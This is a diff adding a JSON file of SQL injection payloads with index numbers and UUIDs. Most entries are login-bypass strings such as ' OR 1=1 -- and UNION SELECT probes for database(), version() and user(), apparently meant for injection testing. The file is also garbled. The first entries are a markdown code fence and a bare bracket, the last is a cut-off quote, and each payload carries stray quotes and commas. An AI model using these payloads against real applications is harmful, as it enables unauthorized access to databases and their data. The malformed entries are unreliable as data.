@@ -1,0 +1,142 @@
+[
+    {
+        "index": 1,
+        "id": "05403044-c70c-4036-82a4-34eb54c633d9",
+        "payload": "```json"
+    },
+    {
+        "index": 2,
+        "id": "e8662175-bd90-444f-b50c-e537c51249d6",
+        "payload": "["
+    },
+    {
+        "index": 3,
+        "id": "b538433b-1e4c-4936-ae7e-728df699da45",
+        "payload": "\"' OR '1'='1\","
+    },
+    {
+        "index": 4,
+        "id": "5a8a76d9-0bbf-4e82-99de-abd0f92f0606",
+        "payload": "\"' OR '1'='1' #\","
+    },
+    {
+        "index": 5,
+        "id": "0538557b-b898-4e60-9602-d79744dc7e61",
+        "payload": "\"' OR '1'='1' -- \","
+    },
+    {
+        "index": 6,
+        "id": "7fb83052-f45d-4e51-a8c8-6cf3d4230bc5",
+        "payload": "\"' OR 1=1 -- \","
+    },
+    {
+        "index": 7,
+        "id": "8f64fb46-9ef7-46c9-b1a5-8e22d9db39fa",
+        "payload": "\"' OR 1=1 #\","
+    },
+    {
+        "index": 8,
+        "id": "4f4ce929-e118-4177-8b21-48a6f1fac1b0",
+        "payload": "\"' OR 1=1\","
+    },
+    {
+        "index": 9,
+        "id": "b241c839-114e-4e36-9591-80f5d415dca8",
+        "payload": "\"' OR 'a'='a\","
+    },
+    {
+        "index": 10,
+        "id": "4c212033-cbb8-4e2d-863f-18d0079f7d10",
+        "payload": "\"' OR 'a'='a' #\","
+    },
+    {
+        "index": 11,
+        "id": "0e703658-b086-4bcb-813a-13430809e71c",
+        "payload": "\"' OR 'a'='a' -- \","
+    },
+    {
+        "index": 12,
+        "id": "c98d0467-ef36-454c-8b1c-7aae57c934e3",
+        "payload": "\"' OR 1=0\","
+    },
+    {
+        "index": 13,
+        "id": "57e4b89b-ef26-4d17-a076-10350b6a7ed9",
+        "payload": "\"' OR 1=0 #\","
+    },
+    {
+        "index": 14,
+        "id": "ae79af2f-735b-4b95-a63c-ccc6a86e20a9",
+        "payload": "\"' OR 1=0 -- \","
+    },
+    {
+        "index": 15,
+        "id": "2119d2c6-d68a-4fda-9479-e367986b31a2",
+        "payload": "\"' OR 1=0 OR '1'='1\","
+    },
+    {
+        "index": 16,
+        "id": "b9c82b74-5dff-4afe-b228-0d0e49354c59",
+        "payload": "\"' OR 1=0 OR '1'='1' #\","
+    },
+    {
+        "index": 17,
+        "id": "c27d63fd-9c48-4f92-a592-19513feb12e7",
+        "payload": "\"' OR 1=0 OR '1'='1' -- \","
+    },
+    {
+        "index": 18,
+        "id": "8a20d758-93b1-4d87-b2c8-d0bd05c46212",
+        "payload": "\"' OR 1=1 UNION SELECT 1,2 -- \","
+    },
+    {
+        "index": 19,
+        "id": "40509adf-e5d7-40b2-a407-27dbed69fba5",
+        "payload": "\"' OR 1=1 UNION SELECT 1,2 #\","
+    },
+    {
+        "index": 20,
+        "id": "41b69fcb-7746-4171-8444-f8709d578781",
+        "payload": "\"' UNION SELECT 1,2 -- \","
+    },
+    {
+        "index": 21,
+        "id": "2d063963-3016-4d73-bb9b-950770e1d2bb",
+        "payload": "\"' UNION SELECT 1,2 #\","
+    },
+    {
+        "index": 22,
+        "id": "6fb1875f-e3a0-419f-91b9-a5df96643d79",
+        "payload": "\"' UNION SELECT null,null -- \","
+    },
+    {
+        "index": 23,
+        "id": "459245f7-615c-430a-8f42-198d4970db92",
+        "payload": "\"' UNION SELECT null,null #\","
+    },
+    {
+        "index": 24,
+        "id": "dc32d4e5-48db-4ea5-93c2-da138076510e",
+        "payload": "\"' UNION SELECT database(),version() -- \","
+    },
+    {
+        "index": 25,
+        "id": "3a2cea6b-5891-4f26-89d3-882c91646585",
+        "payload": "\"' UNION SELECT database(),version() #\","
+    },
+    {
+        "index": 26,
+        "id": "4d42e2f8-9a03-48ed-a142-e90ae21ddd23",
+        "payload": "\"' UNION SELECT user(),database() -- \","
+    },
+    {
+        "index": 27,
+        "id": "86475b39-be8b-468c-9b2f-e4dcb96b800f",
+        "payload": "\"' UNION SELECT user(),database() #\","
+    },
+    {
+        "index": 28,
+        "id": "0fd59cda-875f-4af1-a827-4b8c561a4e51",
+        "payload": "\"'"
+    }
+]
